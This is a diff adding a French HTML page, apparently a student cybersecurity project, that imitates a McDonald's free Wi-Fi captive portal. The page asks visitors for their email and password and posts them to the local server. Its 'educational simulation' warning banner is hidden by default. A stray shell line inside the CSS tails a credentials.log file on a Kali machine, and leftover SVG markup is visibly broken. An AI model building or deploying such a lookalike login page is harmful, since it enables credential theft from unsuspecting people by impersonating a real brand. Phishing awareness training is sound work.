@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>McDonald's - Wi-Fi Gratuit</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #292929;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* === Barre jaune supérieure (signature McDo) === */
+        .top-bar {
+            width: 100%;
+            height: 4px;
+            background: #FFC72C;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 0 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* === Logo === */
+        .logo-section {
+            margin-top: 48px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .golden-arches {
+            width: 64px;
+            height: 56px;
+        }
+
+        .brand-text {
+            color: #FFC72C;
+            font-size: 13px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-top: 12px;
+            font-weight: 500;
+        }
+
+        /* === Titre === */
+        .welcome {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 600;
+            text-align: center;
+            margin-top: 32px;
+            line-height: 1.3;
+        }
+
+        .subtitle {
+            color: #a0a0a0;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 8px;
+            line-height: 1.5;
+        }
+
+        /* === Formulaire === */
+        .form-section {
+            width: 100%;
+            margin-top: 32px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #b0b0b0;
+            font-size: 12px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #3a3a3a;
+            border: 1px solid #4a4a4a;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            font-family: inherit;
+            outline: none;
+            transition: border-color 0.2s;
+            -webkit-appearance: none;
+        }
+
+        .input-group input::placeholder {
+            color: #777;
+        }
+
+        .input-group input:focus {
+            border-color: #FFC72C;
+        }
+
+        .btn-connect {
+            width: 100%;
+            padding: 16px;
+            background: #FFC72C;
+            color: #292929;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.15s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-connect:active {
+            background: #e6b325;
+        }
+
+        /* === Séparateur === */
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 24px 0;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #444;
+        }
+
+        .divider span {
+            color: #777;
+            font-size: 12px;
+            padding: 0 12px;
+            text-transform: uppercase;
+        }
+
+        /* === Bouton secondaire === */
+        .btn-skip {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #FFC72C;
+            border: 1px solid #FFC72C;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        .btn-skip:active {
+            background: rgba(255, 199, 44, 0.1);
+        }
+
+        /* === Footer === */
+        .footer {
+            margin-top: 40px;
+            padding-bottom: 32px;
+            text-align: center;
+        }
+
+        .footer p {
+            color: #666;
+            font-size: 11px;
+            line-height: 1.6;
+        }
+
+        .footer a {
+            color: #999;
+            text-decoration: underline;
+        }
+
+        /* === Petit badge Wi-Fi === */
+        .wifi-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 199, 44, 0.1);
+            border: 1px solid rgba(255, 199, 44, 0.2);
+            border-radius: 20px;
+            padding: 6px 14px;
+            margin-top: 20px;
+        }
+
+        .wifi-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .wifi-badge span {
+            color: #FFC72C;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        /* === Bandeau éducatif (visible uniquement pour le jury) === */
+        .edu-banner {
+            width: 100%;
+            background: #d32f2f;
+            color: white;
+            text-align: center;
+            padding: 8px;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+tail -f /home/kali/captive_portal/credentials.log            display: none; /* Mettre "flex" pour la démo au jury */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Bandeau pour le jury : passer display à "flex" lors de la présentation -->
+    <div class="edu-banner">⚠ SIMULATION ÉDUCATIVE — PORTAIL CAPTIF FACTICE — PROJET CYBERSÉCURITÉ ⚠</div>
+
+    <div class="top-bar"></div>
+
+    <div class="container">
+
+        <!-- Logo McDonald's (SVG Golden Arches) -->
+        <div class="logo-section">
+            <!-- Remplace tout le <svg class="golden-arches" ...>...</svg> par : -->
+	    <img src="/logo.png" style="width: 80px; height: auto;">
+                <path d="M150 0 C150 0 90 0 60 130 C45 175 30 220 0 260 L60 260 C75 200 90 140 105 80 C115 45 130 20 150 20 C170 20 185 45 195 80 C210 140 225 200 240 260 L300 260 C270 220 255 175 240 130 C210 0 150 0 150 0Z" fill="#FFC72C"/>
+            </svg>
+            <div class="brand-text">McDonald's</div>
+        </div>
+
+        <!-- Badge Wi-Fi -->
+        <div class="wifi-badge">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#FFC72C" stroke-width="2.5" stroke-linecap="round">
+                <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
+                <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
+                <circle cx="12" cy="20" r="1" fill="#FFC72C"/>
+            </svg>
+            <span>Wi-Fi Gratuit</span>
+        </div>
+
+        <h1 class="welcome">Connectez-vous pour accéder au Wi-Fi gratuit</h1>
+        <p class="subtitle">Utilisez votre compte McDonald's ou créez-en un pour profiter du Wi-Fi illimité.</p>
+
+        <!-- Formulaire de capture -->
+        <div class="form-section">
+            <form method="POST" action="/">
+                <div class="input-group">
+                    <label>Adresse e-mail</label>
+                    <input type="email" name="username" placeholder="votre@email.com" required autocomplete="email">
+                </div>
+                <div class="input-group">
+                    <label>Mot de passe</label>
+                    <input type="password" name="password" placeholder="Votre mot de passe" required autocomplete="current-password">
+                </div>
+                <button type="submit" class="btn-connect">Se connecter</button>
+            </form>
+
+            <div class="divider"><span>ou</span></div>
+
+            <button class="btn-skip" onclick="document.querySelector('form').submit()">Continuer en tant qu'invité</button>
+        </div>
+
+        <div class="footer">
+            <p>En vous connectant, vous acceptez nos <a href="#">Conditions d'utilisation</a> et notre <a href="#">Politique de confidentialité</a>.</p>
+            <p style="margin-top: 8px;">© 2026 McDonald's. Tous droits réservés.</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
